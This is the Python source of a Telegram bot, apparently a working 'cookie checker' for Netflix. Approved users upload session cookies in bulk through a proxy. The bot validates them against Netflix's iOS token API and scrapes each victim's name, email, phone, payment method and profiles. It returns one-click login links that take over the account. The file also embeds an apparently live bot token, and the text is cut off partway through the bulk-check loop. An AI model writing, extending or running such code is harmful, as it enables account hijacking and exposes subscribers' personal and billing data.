import os
import asyncio
import logging
import re
from typing import Dict, Optional, Tuple, Set
import time
from threading import Thread
import sys
import json
import codecs
import requests
import html
import zipfile
import tempfile
import shutil
from flask import Flask
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
)

# ========== CONFIGURATION ==========
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8915335839:AAGRpBFdulQwjjsaKvhZ-aiEUtY7VQdjV3o")
PORT = int(os.environ.get("PORT", 8000))

# SET YOUR TELEGRAM USER ID HERE (Owner Has Permanent Access)
OWNER_ID = int(os.environ.get("OWNER_ID", 6420446828))  # Replace 123456789 with your real Telegram User ID

# Set to store approved User IDs (Owner is automatically added)
APPROVED_USERS: Set[int] = {OWNER_ID}

# Global proxy state and bulk cancel event
CURRENT_PROXY: Optional[str] = None
cancel_bulk_event = asyncio.Event()

# ========== ACCESS CONTROL HELPER ==========
def is_approved(user_id: int) -> bool:
    return user_id in APPROVED_USERS or user_id == OWNER_ID

# ========== FLASK APP & HEALTH ENDPOINTS ==========
app = Flask(__name__)

@app.route("/", methods=["GET"])
def index():
    bot_status = "🟢 Running" if application else "🔴 Stopped"
    proxy_status = CURRENT_PROXY if CURRENT_PROXY else "❌ Not Set (Required)"
    return f"""
    <html>
        <head>
            <title>Netflix Cookie Checker Bot</title>
            <style>
                body {{ font-family: Arial; margin: 40px; background-color: #f5f5f5; }}
                .container {{ background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }}
                .status {{ padding: 20px; border-radius: 5px; margin: 20px 0; }}
                .running {{ background-color: #d4edda; color: #155724; }}
                .stopped {{ background-color: #f8d7da; color: #721c24; }}
                h1 {{ color: #333; }}
                a {{ color: #007bff; text-decoration: none; }}
                a:hover {{ text-decoration: underline; }}
            </style>
        </head>
        <body>
            <div class="container">
                <h1>✅ Netflix Cookie Checker Bot</h1>
                <div class="status {'running' if application else 'stopped'}">
                    <p><b>Bot Status:</b> {bot_status}</p>
                    <p><b>BOT_TOKEN:</b> {'✅ Set' if BOT_TOKEN else '❌ Not Set'}</p>
                    <p><b>Approved Users Count:</b> {len(APPROVED_USERS)}</p>
                    <p><b>Active Proxy:</b> {proxy_status}</p>
                    <p><b>BOT_link: <a href="https://t.me/Cook2linkbot">Redirect</a></b></p>
                    <p><b>Port:</b> {PORT}</p>
                </div>
                <hr>
                <p><a href="/health">Check Health</a></p>
            </div>
        </body>
    </html>
    """, 200

@app.route("/health", methods=["GET"])
def health():
    return {
        "status": "healthy" if application else "unhealthy",
        "bot_running": application is not None,
        "bot_token_set": bool(BOT_TOKEN),
        "approved_users_count": len(APPROVED_USERS),
        "proxy_set": bool(CURRENT_PROXY),
        "current_proxy": CURRENT_PROXY,
        "timestamp": time.time()
    }, 200 if application else 503

# ========== LOGGING SETUP ==========
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

application = None

# ========== MESSAGES & TEXT ==========
START_TEXT = (
    "👋 Netflix Cookie Checker Bot\n\n"
    "⚠️ IMPORTANT: You MUST set a proxy using /addproxy before checking any cookies.\n\n"
    "Available Commands:\n"
    "• /addproxy `<proxy>` — Add & test an HTTP proxy (REQUIRED)\n"
    "  Supported formats:\n"
    "  - `host:port` or `http://host:port`\n"
    "  - `user:pass@host:port` or `http://user:pass@host:port`\n"
    "  - `user:pass:host:port` or `http://user:pass:host:port`\n"
    "• /stop — Halt an ongoing bulk check immediately\n"
    "• /help — Usage instructions\n\n"
    "Owner Commands:\n"
    "• /approve `<userid>` — Grant access to a user\n"
    "• /disapprove `<userid>` — Revoke access from a user\n"
    "• /approved — View list of approved users\n\n"
    " Bot by @zyokr 🦖"
)

HELP_TEXT = (
    "How to use:\n"
    "1. Access is restricted. Ask owner for approval.\n"
    "2. MANDATORY: Set a working proxy using `/addproxy` before checking.\n"
    "   Proxy Formats Supported:\n"
    "   • host:port\n"
    "   • user:pass@host:port\n"
    "   • user:pass:host:port\n"
    "3. Paste cookies as text, upload a `.txt` file, or upload a `.zip` archive.\n"
    "4. Use `/stop` anytime to halt bulk processing."
)

COOKIE_KV_RE = re.compile(r"^\s*([A-Za-z0-9_\\-]+)\s*=\s*(.+?)\s*$", re.DOTALL)


# ========== HELPER FUNCTIONS FOR PROXY & PARSING ==========
def _format_proxy_string(raw_proxy: str) -> str:
    proxy = raw_proxy.strip()
    scheme = "http://"
    if proxy.startswith("http://"):
        proxy = proxy[7:]
    elif proxy.startswith("https://"):
        scheme = "https://"
        proxy = proxy[8:]

    parts = proxy.split(":")
    if len(parts) == 4:
        user, password, host, port = parts
        return f"{scheme}{user}:{password}@{host}:{port}"
    
    return f"{scheme}{proxy}"

def _get_request_proxies() -> Optional[Dict[str, str]]:
    if CURRENT_PROXY:
        return {"http": CURRENT_PROXY, "https": CURRENT_PROXY}
    return None

def _is_proxy_live(proxy_str: str) -> Tuple[bool, str]:
    proxies = {"http": proxy_str, "https": proxy_str}
    try:
        r = requests.get("https://httpbin.org/ip", proxies=proxies, timeout=8, verify=False)
        if r.status_code == 200:
            ip = r.json().get("origin", "Unknown IP")
            return True, f"Live! Outbound IP: `{ip}`"
        return False, f"Failed with status code {r.status_code}"
    except Exception as e:
        return False, str(e)

def _is_json_cookie(text: str) -> bool:
    text = text.strip()
    if not (text.startswith('[') and text.endswith(']')):
        return False
    try:
        json.loads(text)
        return True
    except Exception:
        return False

def _is_netscape_cookie(text: str) -> bool:
    lines = text.strip().split('\n')
    if len(lines) < 1:
        return False
    
    for line in lines:
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        
        if '\t' in line:
            parts = line.split('\t')
            if len(parts) >= 7:
                return True
        else:
            parts = line.split()
            if len(parts) >= 7:
                domain = parts[0]
                flag = parts[1]
                path = parts[2]
                secure = parts[3]
                try:
                    _ = int(parts[4])
                    if domain.startswith('.') and flag in ['TRUE', 'FALSE'] and path == '/' and secure in ['TRUE', 'FALSE']:
                        return True
                except (ValueError, IndexError):
                    continue
    return False

def _looks_like_cookie_header(text: str) -> bool:
    t = text.strip().lower()
    return t.startswith("cookie:") or (";" in text and "=" in text)

def _extract_json_cookies(json_str: str) -> Dict[str, str]:
    try:
        cookies_array = json.loads(json_str)
        kv: Dict[str, str] = {}
        if isinstance(cookies_array, list):
            for cookie_obj in cookies_array:
                if isinstance(cookie_obj, dict):
                    name = cookie_obj.get('name', '')
                    value = cookie_obj.get('value', '')
                    if name and value:
                        kv[name] = value
        return kv
    except Exception as e:
        logger.error(f"Error parsing JSON cookies: {e}")
        return {}

def _extract_netscape_cookies(netscape_str: str) -> Dict[str, str]:
    kv: Dict[str, str] = {}
    lines = netscape_str.strip().split('\n')
    
    for line in lines:
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        
        delimiter = '\t' if '\t' in line else ' '
        parts = line.split(delimiter)
        
        if len(parts) >= 7:
            try:
                name = parts[5]
                if delimiter == '\t':
                    value = parts[6]
                else:
                    match = re.match(r'^(\S+)\s+(\S+)\s+(\S+)\s+(\S+)\s+(\S+)\s+(\S+)\s+(.+)$', line)
                    value = match.group(7).strip() if match else ' '.join(parts[6:])
                
                if name and value:
                    kv[name] = value
            except Exception:
                continue
    return kv

def _extract_cookie_kv_pairs(text: str) -> Dict[str, str]:
    cleaned = re.sub(r"(?i)^\s*cookie\s*:\s*", "", text).strip()
    parts = [p.strip() for p in cleaned.split(";") if p.strip()]
    if len(parts) == 1 and "\n" in cleaned:
        parts = [p.strip() for p in cleaned.splitlines() if p.strip()]

    kv: Dict[str, str] = {}
    for part in parts:
        m = COOKIE_KV_RE.match(part)
        if m:
            kv[m.group(1).strip()] = m.group(2).strip()
    return kv

def _build_cookie_header(cookie_input: str) -> Optional[str]:
    if _is_json_cookie(cookie_input):
        kv = _extract_json_cookies(cookie_input)
        if kv:
            return "; ".join([f"{k}={v}" for k, v in kv.items()])
    
    if _is_netscape_cookie(cookie_input):
        kv = _extract_netscape_cookies(cookie_input)
        if kv:
            return "; ".join([f"{k}={v}" for k, v in kv.items()])
    
    if _looks_like_cookie_header(cookie_input):
        cleaned = re.sub(r"(?i)^\s*cookie\s*:\s*", "", cookie_input).strip()
        if "=" not in cleaned:
            return None
        kv = _extract_cookie_kv_pairs(cookie_input)
        if kv:
            return "; ".join([f"{k}={v}" for k, v in kv.items()])
        return cleaned

    kv = _extract_cookie_kv_pairs(cookie_input)
    if kv:
        return "; ".join([f"{k}={v}" for k, v in kv.items()])
    return None

def _split_multiple_cookies(text: str) -> list[str]:
    text = text.strip()
    if _is_json_cookie(text):
        return [text]
    
    blocks = re.split(r'\n\s*\n', text)
    cookie_list = []
    
    for block in blocks:
        block = block.strip()
        if not block:
            continue
        lines = block.splitlines()
        if any("netflixid" in line.lower() for line in lines):
            cookie_list.append(block)
        else:
            for line in lines:
                line = line.strip()
                if "netflixid" in line.lower():
                    cookie_list.append(line)
                    
    return cookie_list if cookie_list else [text]

def _safe_preview_cookie_keys(cookie_header: str) -> str:
    names = []
    for token in cookie_header.split(";"):
        token = token.strip()
        if "=" in token:
            names.append(token.split("=", 1)[0].strip())
    names = [n for n in names if n]
    return ", ".join(names[:8]) + ("…" if len(names) > 8 else "")


# ========== NETFLIX API & VERIFICATION ==========
NFTOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
NFTOKEN_QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}

NFTOKEN_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

def _extract_netflix_id_from_cookie_header(cookie_header: str) -> Optional[str]:
    for token in cookie_header.split(";"):
        token = token.strip()
        if not token or "=" not in token:
            continue
        k, v = token.split("=", 1)
        if k.strip().lower() == "netflixid":
            return v.strip()
    return None

def _generate_nftoken(cookie_header: str, timeout_s: int = 20) -> Tuple[bool, str, Optional[str]]:
    netflix_id = _extract_netflix_id_from_cookie_header(cookie_header)
    if not netflix_id:
        return False, "Invalid or expired cookie. NetflixId not found.", None

    headers = dict(NFTOKEN_HEADERS)
    headers["Cookie"] = f"NetflixId={netflix_id}"

    try:
        r = requests.get(
            NFTOKEN_API_URL,
            params=NFTOKEN_QUERY_PARAMS,
            headers=headers,
            proxies=_get_request_proxies(),
            timeout=timeout_s,
            verify=False,
        )
        r.raise_for_status()
        data = r.json()

        td = ((((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {})
        nftoken = td.get("token")

        if not nftoken:
            return False, "Invalid or expired cookie. Token generation failed.", None

        return True, "Token API returned a valid nftoken.", nftoken
    except Exception as e:
        logger.error(f"Error generating nftoken: {e}")
        return False, "Invalid or expired cookie.", None

def decode_text(value):
    if value is None:
        return "Unknown"
    value = str(value)
    try:
        value = codecs.decode(value, "unicode_escape")
    except Exception:
        pass
    value = html.unescape(value)
    value = re.sub(
        r'\\x([0-9A-Fa-f]{2})',
        lambda m: bytes.fromhex(m.group(1)).decode('latin1'),
        value
    )
    return value.strip()

def _check_netflix_cookie(cookie_header: str, timeout_s: int = 25) -> Dict[str, str]:
    cookie_dict: Dict[str, str] = {}
    for token in cookie_header.split(";"):
        token = token.strip()
        if not token or "=" not in token:
            continue
        k, v = token.split("=", 1)
        cookie_dict[k.strip()] = v.strip()

    if not cookie_dict.get("NetflixId"):
        return {"ok": False, "reason": "No NetflixId found in cookies"}

    session = requests.Session()
    session.cookies.update(cookie_dict)
    if CURRENT_PROXY:
        session.proxies.update(_get_request_proxies())

    headers = {
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/124.0.0.0 Safari/537.36"
        ),
        "Accept": "text/html,application/xhtml+xml",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate",
    }

    urls = [
        "https://www.netflix.com/YourAccount",
        "https://www.netflix.com/account",
        "https://www.netflix.com/account/membership",
    ]

    try:
        resp = None
        txt = ""
        for url in urls:
            try:
                r = session.get(url, headers=headers, timeout=timeout_s, allow_redirects=True, verify=False)
                if r.status_code == 200 and "Account" in (r.text or ""):
                    resp = r
                    txt = r.text or ""
                    break
            except Exception:
                continue

        if not resp or resp.status_code != 200:
            return {"ok": False, "reason": f"HTTP {resp.status_code if resp else 'error'}"}

        if ("login" in (resp.url or "").lower()) or ("signin" in (resp.url or "").lower()):
            return {"ok": False, "reason": "Redirected to login"}

        def find(pattern: str) -> Optional[str]:
            m = re.search(pattern, txt)
            return decode_text(m.group(1)) if m else None

        name = find(r'"accountOwnerName"\s*:\s*"([^"]+)"') or find(r'"firstName"\s*:\s*"([^"]+)"')
        plan_raw = find(r'localizedPlanName.{1,50}?value":"([^"]+)"') or find(r'"planName"\s*:\s*"([^"]+)"')
        country = (
            find(r'"countryOfSignup"\s*:\s*"([^"]+)"')
            or find(r'"countryCode"\s*:\s*"([^"]+)"')
            or find(r'"currentCountry"\s*:\s*"([^"]+)"')
        )
        email = (
            find(r'"emailAddress"\s*:\s*"([^"]+)"')
            or find(r'"email"\s*:\s*"([^"]+)"')
            or find(r'"loginId"\s*:\s*"([^"]+)"')
        )
        member_since = find(r'"memberSince":"([^"]+)"')
        next_billing = (
            find(r'"nextBillingDate":\{[^}]*"date":"([^T"]+)"')
            or find(r'"nextBilling"[^}]*"value":"([^"]+)"')
        )
        plan_price = (
            find(r'"planPrice":\{"fieldType":"String","value":"([^"]+)"')
            or find(r'"formattedPlanPrice"\s*:\s*"([^"]+)"')
        )
        payment = (
            find(r'"paymentMethod":\{"fieldType":"String","value":"([^"]+)"')
            or find(r'"paymentMethodType"\s*:\s*"([^"]+)"')
        )
        phone = (
            find(r'"phoneNumberDigits":\{[^}]*"value":"([^"]+)"')
            or find(r'"phoneNumber"\s*:\s*"([^"]+)"')
        )
        quality = (
            find(r'"videoQuality":\{"fieldType":"String","value":"([^"]+)"')
            or find(r'"maxVideoQuality"\s*:\s*"([^"]+)"')
        )
        streams = (
            find(r'"maxStreams":\{"fieldType":"Numeric","value":([0-9]+)')
            or find(r'"maxStreams"\s*:\s*"?([0-9]+)"?')
        )
        
        # Enhanced Payment Hold / Update Payment Method Detector
        hold_patterns = (
            r"(?i)("
            r"membership\s+is?\s*on\s+hold|"
            r"payment\s+is?\s*on\s+hold|"
            r"update\s+payment\s+method|"
            r"update\s+your\s+payment|"
            r"restart\s+your\s+membership|"
            r"action\s+required|"
            r"payment\s+problem|"
            r'accountstatus["\s:]+hold|'
            r'accountstatus["\s:]+needs_payment|'
            r'billingstatus["\s:]+hold|'
            r'ispaymentproblem["\s:]+true|'
            r'ishold["\s:]+true'
            r")"
        )
        hold = "Yes" if re.search(hold_patterns, txt) else "No"

        extra = "Yes" if re.search(r'"showExtraMemberSection":\{"fieldType":"Boolean","value":true', txt) else "No"
        email_ver = "Yes" if re.search(r'"emailVerified"\s*:\s*true', txt) else "No"
        ms = find(r'"membershipStatus":\s*"([^"]+)"') or "CURRENT_MEMBER"

        profiles: list = []
        try:
            rp = session.get("https://www.netflix.com/ManageProfiles", timeout=15, verify=False)
            if rp.status_code == 200:
                profiles = re.findall(r'"profileName"\s*:\s*"([^"]+)"', rp.text or "")
                if not profiles:
                    profiles = re.findall(r'"displayName"\s*:\s*"([^"]+)"', rp.text or "")
                if not profiles:
                    profiles = re.findall(r'"name"\s*:\s*"([^"]+)"', rp.text or "")
        except Exception:
            pass

        profiles_str = (
            ", ".join(decode_text(p) for p in profiles)
            if profiles else (name or "Unknown")
        )

        return {
            "ok": True,
            "name": name or "Unknown",
            "email": email or "Unknown",
            "country": country or "Unknown",
            "plan": plan_raw or "Unknown",
            "plan_price": plan_price or "N/A",
            "member_since": member_since or "Unknown",
            "next_billing": next_billing or "Unknown",
            "payment_method": payment or "CC",
            "phone": phone or "N/A",
            "has_phone": "Yes" if phone else "No",
            "video_quality": quality or "HD",
            "max_streams": streams or "2",
            "on_payment_hold": hold,
            "extra_member": extra,
            "email_verified": email_ver,
            "membership_status": ms,
            "profiles": profiles_str,
            "connected_profiles": str(len(profiles)) if profiles else "1"
        }
    except Exception as e:
        logger.error(f"Error checking netflix cookie: {e}")
        return {"ok": False, "reason": str(e)}


# ========== OWNER APPROVAL SYSTEM COMMANDS ==========
async def approve_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Only the bot owner can approve users.")
        return

    if not context.args:
        await update.message.reply_text("⚠️ Usage: `/approve <user_id>`", parse_mode="Markdown")
        return

    try:
        target_id = int(context.args[0].strip())
        APPROVED_USERS.add(target_id)
        await update.message.reply_text(f"✅ User `{target_id}` has been approved to use the bot!", parse_mode="Markdown")
    except ValueError:
        await update.message.reply_text("❌ Invalid User ID. Please provide a numeric Telegram ID.")

async def disapprove_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Only the bot owner can disapprove users.")
        return

    if not context.args:
        await update.message.reply_text("⚠️ Usage: `/disapprove <user_id>`", parse_mode="Markdown")
        return

    try:
        target_id = int(context.args[0].strip())
        if target_id == OWNER_ID:
            await update.message.reply_text("❌ You cannot disapprove the Owner!")
            return
        
        if target_id in APPROVED_USERS:
            APPROVED_USERS.remove(target_id)
            await update.message.reply_text(f"🚫 User `{target_id}` has been removed from approved users.", parse_mode="Markdown")
        else:
            await update.message.reply_text("⚠️ User ID is not currently in the approved list.")
    except ValueError:
        await update.message.reply_text("❌ Invalid User ID.")

async def approved_list_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Only the bot owner can view approved users.")
        return

    users_text = "\n".join([f"• `{uid}`" for uid in APPROVED_USERS])
    await update.message.reply_text(f"👥 Approved Users List:\n\n{users_text}", parse_mode="Markdown")


# ========== TELEGRAM HANDLER FUNCTIONS ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_approved(user_id):
        await update.message.reply_text(f"🚫 Access Denied!\nYour Telegram User ID is `{user_id}`.\nAsk the owner to approve your access.", parse_mode="Markdown")
        return

    try:
        logger.info(f"📱 /start from {user_id}")
        await update.message.reply_text(START_TEXT, parse_mode="Markdown")
    except Exception as e:
        logger.error(f"Error in start: {e}")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_approved(user_id):
        await update.message.reply_text(f"🚫 Access Denied! Ask the owner to approve User ID: `{user_id}`", parse_mode="Markdown")
        return

    try:
        logger.info(f"❓ /help from {user_id}")
        await update.message.reply_text(HELP_TEXT)
    except Exception as e:
        logger.error(f"Error in help: {e}")

async def addproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_approved(user_id):
        await update.message.reply_text(f"🚫 Access Denied! Ask owner for approval. Your ID: `{user_id}`", parse_mode="Markdown")
        return

    global CURRENT_PROXY
    if not context.args:
        await update.message.reply_text(
            "⚠️ Please provide a proxy string.\n\n"
            "Supported Formats:\n"
            "• `/addproxy host:port`\n"
            "• `/addproxy user:pass@host:port`\n"
            "• `/addproxy user:pass:host:port`",
            parse_mode="Markdown"
        )
        return

    raw_proxy = context.args[0].strip()
    formatted_proxy = _format_proxy_string(raw_proxy)

    msg = await update.message.reply_text("🔄 Testing proxy connection...", parse_mode="Markdown")
    
    loop = asyncio.get_running_loop()
    is_live, status_detail = await loop.run_in_executor(None, _is_proxy_live, formatted_proxy)

    if is_live:
        CURRENT_PROXY = formatted_proxy
        await msg.edit_text(
            f"✅ Proxy Added Successfully!\n\n"
            f"• Proxy: `{formatted_proxy}`\n"
            f"• Status: {status_detail}",
            parse_mode="Markdown"
        )
    else:
        await msg.edit_text(
            f"❌ Proxy Validation Failed!\n\n"
            f"• Error: {status_detail}\n"
            f"The proxy was not added.",
            parse_mode="Markdown"
        )

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_approved(user_id):
        await update.message.reply_text(f"🚫 Access Denied! Your ID: `{user_id}`", parse_mode="Markdown")
        return

    cancel_bulk_event.set()
    await update.message.reply_text("🛑 Stop signal sent! Halting the bulk check...")

async def handle_cookie_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if not update.message:
            return

        user_id = update.effective_user.id
        if not is_approved(user_id):
            await update.message.reply_text(f"🚫 Access Denied!\nYour Telegram User ID is `{user_id}`.\nContact the owner to grant you access.", parse_mode="Markdown")
            return

        # STRICT RULE: Proxy must be set before checking
        if not CURRENT_PROXY:
            await update.message.reply_text(
                "⚠️ **Proxy Required!**\n\n"
                "You must set a live proxy before checking cookies.\n"
                "Use `/addproxy` to set one.",
                parse_mode="Markdown"
            )
            return

        cookie_input = (update.message.text or "").strip()
        logger.info(f"📨 Message from {user_id}: {len(cookie_input)} chars")
        
        if not cookie_input:
            await update.message.reply_text("Please paste your cookies.")
            return

        cookie_header = _build_cookie_header(cookie_input)
        if not cookie_header:
            await update.message.reply_text(
                "❌ Could not parse cookies.\n\n"
                "Paste in one of these formats:\n"
                "• Full `Cookie:` header line\n"
                "• Netscape format (.txt cookie file)\n"
                "• JSON array format\n"
                "• Key=Value pairs (NetflixId=..., SecureNetflixId=...)"
            )
            return

        preview = _safe_preview_cookie_keys(cookie_header)
        msg = await update.message.reply_text(f"🔎 Checking Netflix cookies...\n(Keys: {preview})")

        loop = asyncio.get_running_loop()
        ok, detail, nftoken = await loop.run_in_executor(None, _generate_nftoken, cookie_header)

        if ok and nftoken:
            acct = await loop.run_in_executor(None, _check_netflix_cookie, cookie_header)

            phone_link = f"https://www.netflix.com/unsupported?nftoken={nftoken}"
            desktop_link = f"https://www.netflix.com/browse?nftoken={nftoken}"

            formatted_text = (
                "📁 Source:\n"
                "pasted_cookie.txt\n"
                "✅ Status: Valid Premium Account\n\n"
                "👤 Account Details:\n"
                f"• Name: {acct.get('name', 'Unknown')}\n"
                f"• Email: {acct.get('email', 'Unknown')}\n"
                f"• Country: {acct.get('country', 'Unknown')}\n"
                f"• Plan: {acct.get('plan', 'Unknown')}\n"
                f"• Price: {acct.get('plan_price', 'N/A')}\n"
                f"• Member Since: {acct.get('member_since', 'Unknown')}\n"
                f"• Next Billing: {acct.get('next_billing', 'Unknown')}\n"
                f"• Payment: {acct.get('payment_method', 'CC')}\n"
                f"• Phone: {acct.get('phone', 'N/A')} ({acct.get('has_phone', 'No')})\n"
                f"• Quality: {acct.get('video_quality', 'HD')}\n"
                f"• Streams: {acct.get('max_streams', '2')}\n"
                f"• Hold Status: {acct.get('on_payment_hold', 'No')}\n"
                f"• Extra Member: {acct.get('extra_member', 'No')}\n"
                f"• Extra Member Slot: Unknown\n"
                f"• Email Verified: {acct.get('email_verified', 'No')}\n"
                f"• Membership Status: {acct.get('membership_status', 'CURRENT_MEMBER')}\n"
                f"• Connected Profiles: {acct.get('connected_profiles', '1')}\n"
                f"• Profiles: {acct.get('profiles', 'Unknown')}"
            )

            keyboard = [
                [
                    InlineKeyboardButton("💻 PC Login", url=desktop_link),
                    InlineKeyboardButton("📱 Phone Login", url=phone_link)
                ]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)

            await msg.edit_text(
                formatted_text,
                reply_markup=reply_markup,
                disable_web_page_preview=True
            )
            logger.info(f"✅ Cookie validation successful for {user_id}")
        else:
            await msg.edit_text(f"❌ {detail}")
            logger.warning(f"❌ Cookie validation failed for {user_id}: {detail}")
    except Exception as e:
        logger.error(f"Error in handle_cookie_text: {e}", exc_info=True)
        try:
            await update.message.reply_text("❌ Error processing request")
        except Exception:
            pass

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_approved(user_id):
        await update.message.reply_text(f"🚫 Access Denied!\nYour Telegram User ID is `{user_id}`.\nContact owner for access.", parse_mode="Markdown")
        return

    # STRICT RULE: Proxy must be set before checking files
    if not CURRENT_PROXY:
        await update.message.reply_text(
            "⚠️ **Proxy Required!**\n\n"
            "You must set a live proxy before uploading files to check.\n"
            "Use `/addproxy` to set one.",
            parse_mode="Markdown"
        )
        return

    document = update.message.document
    filename = document.file_name or "document"
    
    if not filename.endswith(('.txt', '.zip')):
        await update.message.reply_text("⚠️ Please upload a valid `.txt` cookie file or a `.zip` archive.")
        return

    cancel_bulk_event.clear()
    status_msg = await update.message.reply_text(f"📥 Downloading `{filename}`...")

    temp_dir = tempfile.mkdtemp()
    file_path = os.path.join(temp_dir, filename)

    try:
        tg_file = await context.bot.get_file(document.file_id)
        await tg_file.download_to_drive(file_path)

        raw_files = []
        if filename.endswith('.zip'):
            with zipfile.ZipFile(file_path, 'r') as zip_ref:
                zip_ref.extractall(temp_dir)
            for root, _, files in os.walk(temp_dir):
                for f in files:
                    if f.endswith('.txt'):
                        raw_files.append(os.path.join(root, f))
        else:
            raw_files.append(file_path)

        cookie_queue = []
        for f_path in raw_files:
            try:
                with open(f_path, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                extracted = _split_multiple_cookies(content)
                fname = os.path.basename(f_path)
                for idx, c_text in enumerate(extracted, start=1):
                    tag = f"{fname} (Cookie #{idx})" if len(extracted) > 1 else fname
                    cookie_queue.append((tag, c_text))
            except Exception as e:
                logger.error(f"Error reading {f_path}: {e}")

        total_cookies = len(cookie_queue)
        valid_count = 0
        dead_count = 0

        await status_msg.edit_text(
            f"🔄 Found {total_cookies} cookie(s) to check!\nSend /stop to halt anytime."
        )

        loop = asyncio.get_running_loop()

        for idx, (display_name, cookie_raw) in enumerate(cookie_queue, start=1):
            # Yield control back to event loop so /stop command can execute concurrently
            await asyncio.sleep(0)

            if cancel_bulk_event.is_set():
                logger.info("Bulk check cancelled by user via /stop")
                break

            try:
                cookie_header = _build_cookie_header(cookie_raw)
                if not cookie_header:
                    dead_count += 1
                    continue

                ok, detail, nftoken = await loop.run_in_executor(None, _generate_nftoken, cookie_header)

                # Check cancel flag again after HTTP request returns
                if cancel_bulk_event.is_set():
                    logger.info("Bulk check cancelled post-request via /stop")
                    break

                if ok and nftoken:
                    acct = await loop.run_in_executor(None, _check_netflix_cookie, cookie_header)
                    
                    phone_link = f"https://www.netflix.com/unsupported?nftoken={nftoken}"
                    desktop_link = f"https://www.netflix.com/browse?nftoken={nftoken}"

                    formatted_text = (
                        f"📁 Source:\n{display_name}\n"
                        f"✅ Status: Valid Premium Account\n\n"
                        f"👤 Account Details:\n"
